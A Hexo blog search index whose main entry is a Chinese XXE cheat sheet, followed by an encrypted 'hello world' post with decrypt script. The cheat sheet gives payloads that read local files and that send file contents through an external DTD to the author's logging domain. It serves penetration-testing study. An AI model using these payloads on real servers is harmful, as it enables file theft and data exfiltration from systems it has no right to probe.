<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>xxe</title>
    <url>/2019/12/02/xxe/</url>
    <content><![CDATA[<h1 id="XXE小结"><a href="#XXE小结" class="headerlink" title="XXE小结"></a>XXE小结</h1><p><strong>1、测试是否禁用dtd</strong></p>
<p><code>!DOCTYPE foo</code>  定义此文档是 foo类型的文档</p>
<p><code>!ELEMENT foo ANY</code>  ANY 声明的元素，可包含任何可解析数据的组合 </p>
<p><code>!ENTITY xxe &quot;testXXE&quot;</code>  !ENTITY 实体名称 “实体的值”</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>        </span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo [ </span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY xxe "testXXE"&gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="meta">] &gt;</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="tag">&lt;<span class="name">firstname</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span><span class="tag">&lt;<span class="name">lastname</span>&gt;</span>666<span class="tag">&lt;/<span class="name">lastname</span>&gt;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span></pre></td></tr></table></figure>



<p><img src="/images/loading.gif" data-original="image-20191128170713993.png" alt="image-20191128170713993"></p>
<p><strong>2、测试是否可回显本地文件</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">xxe</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>"&gt;</span> </span></pre></td></tr><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">xxe</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">sys</span>/<span class="attr">power</span>/<span class="attr">image_size</span>"&gt;</span>   #payload：无特殊字符，返回只有一行数字</span></pre></td></tr></table></figure>



<p><img src="/images/loading.gif" data-original="image-20191128171532350.png" alt="image-20191128171532350"></p>
<p><strong>3、dnslog盲打</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#用于快速发现是否存在xxe漏洞</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;        </span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ </span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!ELEMENT foo ANY &gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;xxe.test.log.a0xpg.com&quot;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">] &gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;foo&gt;&amp;xxe;&lt;&#x2F;foo&gt;</span></pre></td></tr></table></figure>



<p><img src="/images/loading.gif" data-original="image-20191128172004334.png" alt="image-20191128172004334"></p>
<p><strong>4、外部dtd盲打</strong></p>
<p>无回显盲打xxe，用于fileattack测试</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE foo SYSTEM "http://www.a0xpg.com/log.dtd"&gt;</span></span></pre></td></tr></table></figure>

<p><code>注意</code>：特殊字符会破坏URL</p>
<p><a href="http://www.a0xpg.com/log.dtd" target="_blank" rel="noopener">http://www.a0xpg.com/log.dtd</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;sys&#x2F;power&#x2F;image_size&quot;&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;!ENTITY % param1 &#39;&lt;!ENTITY &amp;#x25; external SYSTEM &quot;http:&#x2F;&#x2F;xxe.log.a0xpg.com&#x2F;x&#x3D;%payload;&quot;&gt;&#39;&gt; %param1; %external;</span></pre></td></tr></table></figure>



<p><strong>5、支持的协议</strong></p>
<p><img src="/images/loading.gif" data-original="image-20191128181129606.png" alt="image-20191128181129606"></p>
<p><code>tips</code>: java中可以使用netdoc代替file</p>
<p><strong>6、xxe利用</strong></p>
<p>读取多行文件可以使用ftp服务器</p>
]]></content>
  </entry>
  <entry>
    <title>Hello Word - Hexo</title>
    <url>/2019/05/26/hello-world/</url>
    <content><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
			['resetEquationNumbers', MathJax.InputJax.TeX],
			['PreProcess', MathJax.Hub],
			['Reprocess', MathJax.Hub]
		);
	}
}
</script>
<div id="enc_content" style="display:none">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</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
	document.getElementById("enc_error").innerHTML = "password error!"
};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
      <categories>
        <category>测试</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>test</tag>
      </tags>
  </entry>
</search>
